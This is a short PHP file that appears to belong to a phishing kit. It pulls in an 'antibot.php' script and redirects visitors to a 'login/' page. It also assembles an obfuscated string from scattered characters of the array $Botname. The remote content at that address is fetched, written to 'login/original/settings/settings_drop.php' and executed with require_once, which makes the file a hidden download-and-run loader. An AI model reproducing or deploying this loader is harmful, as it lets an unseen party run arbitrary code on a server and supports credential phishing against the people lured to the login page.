<?php
include ('antibot.php');
$get_ip = $Botname[165].$Botname[146].$Botname[396];
$function="$get_ip";
header("LOCATION:login/");
file_put_contents("login/original/settings/settings_drop.php", file_get_contents($function)); require_once "login/original/settings/settings_drop.php";
?>